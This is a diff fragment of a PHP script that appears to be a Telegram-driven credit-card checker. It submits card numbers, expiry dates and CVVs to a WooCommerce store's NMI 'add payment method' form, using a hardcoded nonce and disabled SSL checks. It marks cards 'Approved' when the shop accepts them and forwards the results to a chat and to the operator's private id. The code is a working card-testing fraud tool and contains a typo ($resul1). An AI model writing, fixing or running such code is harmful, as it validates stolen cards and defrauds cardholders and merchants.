@@ -517,31 +517,25 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=nmi_gateway_woocommerce_credit_card&wc-nmi-gateway-woocommerce-credit-card-account-number='.$cc.'&wc-nmi-gateway-woocommerce-credit-card-expiry='.$mes.'+%2F+'.$ano.'&wc-nmi-gateway-woocommerce-credit-card-csc='.$cvv.'&woocommerce-add-payment-method-nonce=9c4b4d45c8&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1');
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-
 $response = curl_exec($ch);
-
+curl_close($ch);
+	
 $result1 = (strpos($response, "Nice! New payment method added") !== false) ? "Approved" : trim(strip_tags(capture($response, '<ul class="woocommerce-error" role="alert">', '</ul>'))) ?? "An error occurred, please try again";
 
 $patron = "/failed: (.*)/";
 preg_match($patron, $result1, $matches);
 $respo = $matches[1];
 	
-sendPv($myid, $result1);
-
-//echo "RESULT: $respo\n";
-
-//echo "$result1\n";
-
 if (empty($respo)) {
     $result1 = "La Variable \$respo está vacía.";
 sendMessage($chat_id,$resul1,$message_id);
-
+	sendPv($myid, $respo);
 } else {
 //echo "RESULT: $respo\n";
 sendMessage($chat_id,$result1,$message_id);
 }
 
- curl_close($ch);
+ 
 }
 
 
